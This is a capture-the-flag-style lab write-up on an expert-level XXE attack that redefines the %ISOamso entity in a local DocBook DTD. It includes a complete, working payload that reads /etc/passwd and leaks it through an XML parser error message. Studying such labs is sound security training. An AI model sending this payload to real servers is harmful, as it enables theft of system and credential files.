Exploiting XXE to retrieve data by repurposing a local DTD

**Category**: XXE  
**Difficulty**: Expert  

---

## Overview / What I Learned

This lab demonstrates how XML External Entity (XXE) injection can be used to exfiltrate local files from the server by:
- Referencing a local DTD on the file system.
- Redefining an existing parameter entity (`ISOamso`) to include a custom payload.
- Triggering an error to reflect file contents in the response.

Key takeaways:
- Local DTDs can be abused when entity definitions like `%ISOamso` are available.
- XXE doesn't need to display the direct XML output â€” triggering error messages can still leak data.

---

## Exploit Steps

### 1. Recon
- Intercepted the `Check stock` XML-based POST request using Burp Suite.
- Noted that the XML parser processed external entities.
- Response didn't reflect XML data but did reflect error messages.

### 2. Payload Planning
- Identified a commonly available DTD:  
  `/usr/share/yelp/dtd/docbookx.dtd`
- Knew this defines the `%ISOamso` entity, which can be redefined.

### 3. Payload Used

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE message [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % ISOamso '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
<stockCheck><productId>1</productId></stockCheck>
4. Execution
Sent the modified request to the server.

The server attempted to resolve the non-existent path containing the contents of /etc/passwd, resulting in an error message that leaked the file contents.

Result
/etc/passwd was successfully leaked via the XML parser error message.
